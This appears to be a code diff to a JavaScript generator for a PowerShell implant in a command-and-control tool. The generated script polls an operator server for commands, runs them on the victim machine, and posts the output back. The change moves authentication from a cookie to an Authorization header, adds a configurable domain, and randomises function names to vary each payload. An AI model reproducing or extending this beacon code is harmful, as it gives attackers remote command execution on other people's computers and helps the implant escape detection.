@@ -271,15 +271,9 @@ function Sleep_start_op(){
 function generate_powershell_http(){
     let base = 
     `
-    $session2321 = nEW-oBjECt Microsoft.PowerShell.Commands.WebRequestSession
-        $cookie1234 = nEW-oBjECt System.Net.Cookie     
-        $cookie1234.Name = "id1234"
-        $cookie1234.Value = "id_value_change_here"
-        $cookie1234.Domain = "localhost"
-        $session2321.Cookies.Add($cookie1234);
     function get_command {
         
-        $req11111 = Invoke-WebRequest "http://localhost:8080/getcommand/get1234" -WebSession $session2321 
+        $req11111 = Invoke-WebRequest "http://localhost:8080/getcommand/get1234" -Headers @{"Authorization"="id_value_change_here"}  
         return $req11111.Content 
     }
     function run_command([string]$command_here){
@@ -290,7 +284,7 @@ function generate_powershell_http(){
     
 
         $postParams = @{rfile=$command}
-        $req = Invoke-WebRequest "http://localhost:8080/response/mskd" -WebSession $session2321 -Method POST -Body $postParams 
+        $req = Invoke-WebRequest "http://localhost:8080/response/mskd" -Headers @{"Authorization"="id_value_change_here"} -Method POST -Body $postParams 
     }
     $varrrrr = 1
     
@@ -312,6 +306,7 @@ function generate_powershell_http(){
     `
     let IP = document.getElementById("powershell_ip").value
     let time_sleep = document.getElementById("time_sleep").value
+    let powershell_domain = document.getElementById("powershell_domain").value
 
     // check if there is slash in the end
     if(IP.substr(IP.length - 1) != "/"){
@@ -319,6 +314,7 @@ function generate_powershell_http(){
     }
     base = base.replaceAll("http://localhost:8080/",IP)
     base = base.replaceAll("time_sleep",time_sleep)
+    base = base.replaceAll("domain_here",powershell_domain)
 
     base =base.replaceAll("get_command",makeid(6))
     base =base.replaceAll("post_response",makeid(6))
